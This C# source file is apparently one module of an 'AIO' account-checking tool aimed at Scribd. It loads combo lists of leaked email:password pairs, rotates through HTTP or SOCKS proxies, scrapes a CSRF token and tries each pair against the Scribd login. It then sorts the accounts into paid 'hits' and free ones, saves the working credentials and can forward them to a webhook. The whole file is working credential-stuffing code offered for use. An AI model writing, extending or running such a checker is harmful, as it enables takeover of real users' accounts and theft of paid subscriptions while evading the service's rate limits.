using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;
using BoltCUI;
using Leaf.xNet;

namespace Bolt_AIO
{
    internal class Scribdmod
    {
        public static List<string> Combos = Program.Combos;
        public static int Combosindex;

        public static void Check()
        {
            for (;;)
            {
                if (Program.Proxyindex > Program.Proxies.Count() - 2) Program.Proxyindex = 0;
                try
                {
                    Interlocked.Increment(ref Program.Proxyindex);
                    using (var req = new HttpRequest())
                    {
                        if (Combosindex >= Combos.Count())
                        {
                            Program.Stop++;
                            break;
                        }

                        Interlocked.Increment(ref Combosindex);
                        var array = Combos[Combosindex].Split(':', ';', '|');
                        var text = array[0] + ":" + array[1];
                        try
                        {
                            switch (Program.ProxyType1)
                            {
                                case "HTTP":
                                    req.Proxy = HttpProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                                case "SOCKS4":
                                    req.Proxy = Socks4ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                                case "SOCKS5":
                                    req.Proxy = Socks5ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                            }

                            req.IgnoreProtocolErrors = true;
                            req.AllowAutoRedirect = true;
                            req.AddHeader("user-agent",
                                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36rv:11.0) like Gecko");
                            req.AddHeader("Pragma", "no-cache");
                            req.AddHeader("Accept", "*/*");
                            req.AddHeader("origin", "https://www.scribd.com");
                            req.AddHeader("referer", "https://www.scribd.com/login");
                            req.AddHeader("sec-fetch-dest", "empty");
                            req.AddHeader("sec-fetch-mode", "cors");
                            req.AddHeader("sec-fetch-site", "same-origin");
                            req.SslCertificateValidatorCallback =
                                (RemoteCertificateValidationCallback) Delegate.Combine(
                                    req.SslCertificateValidatorCallback,
                                    new RemoteCertificateValidationCallback((obj, cert, ssl, error) =>
                                        (cert as X509Certificate2).Verify()));
                            var getscrf = req.Get("https://www.scribd.com/login").ToString();
                            var csrf = Parse(getscrf, "name=\"csrf-token\" content=\"", "\" />");
                            //--------------------------------------
                            req.ClearAllHeaders();
                            req.AddHeader("user-agent",
                                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36rv:11.0) like Gecko");
                            req.AddHeader("Pragma", "no-cache");
                            req.AddHeader("Accept", "*/*");
                            req.AddHeader("origin", "https://www.scribd.com");
                            req.AddHeader("referer", "https://www.scribd.com/login");
                            req.AddHeader("sec-fetch-dest", "empty");
                            req.AddHeader("sec-fetch-mode", "cors");
                            req.AddHeader("sec-fetch-site", "same-origin");
                            req.AddHeader("x-csrf-token", csrf);
                            req.AddHeader("x-requested-with", "XMLHttpRequest");

                            var str = "{\"login_or_email\":\"" + array[0] + "\",\"login_password\":\"" + array[1] +
                                      "\",\"rememberme\":\"\",\"signup_location\":\"https://www.scribd.com/login\",\"login_params\":{}}";
                            var strResponse = req.Post("https://www.scribd.com/login", str, "application/json")
                                .ToString();
                            {
                                if (strResponse.Contains(
                                        "No account found with that email or username. Please try again or sign up.\"}]}") ||
                                    strResponse.Contains("Invalid password. Please try again"))
                                {
                                    Program.Fails++;
                                    Program.TotalChecks++;
                                }
                                else if (strResponse.Contains("success\":true")) //hit
                                {
                                    req.ClearAllHeaders();
                                    req.AddHeader("user-agent",
                                        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36");
                                    req.AddHeader("Pragma", "no-cache");
                                    req.AddHeader("accept",
                                        "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9");
                                    var cap = req.Get("https://www.scribd.com/account-settings").ToString();
                                    if (cap.Contains("next_payment_date\":\""))
                                    {
                                        var validtill = Parse(cap, "next_payment_date\":\"", "\",\"");
                                        Program.Hits++;
                                        Program.TotalChecks++;
                                        Export.AsResult("/Scribd_hits",
                                            array[0] + ":" + array[1] + " | Valid till: " + validtill);
                                        if (Program.lorc == "LOG")
                                            Settings.PrintHit("Scribd", array[0] + ":" + array[1]);
                                        if (Settings.sendToWebhook)
                                            Settings.sendTowebhook1(
                                                array[0] + ":" + array[1] + " | Valid till: " + validtill,
                                                "Scribd Hits");
                                    }
                                    else
                                    {
                                        Program.Frees++;
                                        Program.TotalChecks++;
                                        Export.AsResult("/Scribd_frees", array[0] + ":" + array[1]);
                                        if (Program.lorc == "LOG")
                                            Settings.PrintFree("Scribd", array[0] + ":" + array[1]);
                                    }
                                }
                            }
                        }
                        catch (Exception)
                        {
                            Program.Combos.Add(text);
                        }
                    }
                }
                catch
                {
                    Interlocked.Increment(ref Program.Errors);
                }
            }
        }

        private static string Parse(string source, string left, string right)
        {
            return source.Split(new string[1] {left}, StringSplitOptions.None)[1].Split(new string[1]
            {
                right
            }, StringSplitOptions.None)[0];
        }

        public static string Base64Encode(string plainText)
        {
            return Convert.ToBase64String(Encoding.UTF8.GetBytes(plainText));
        }
    }
}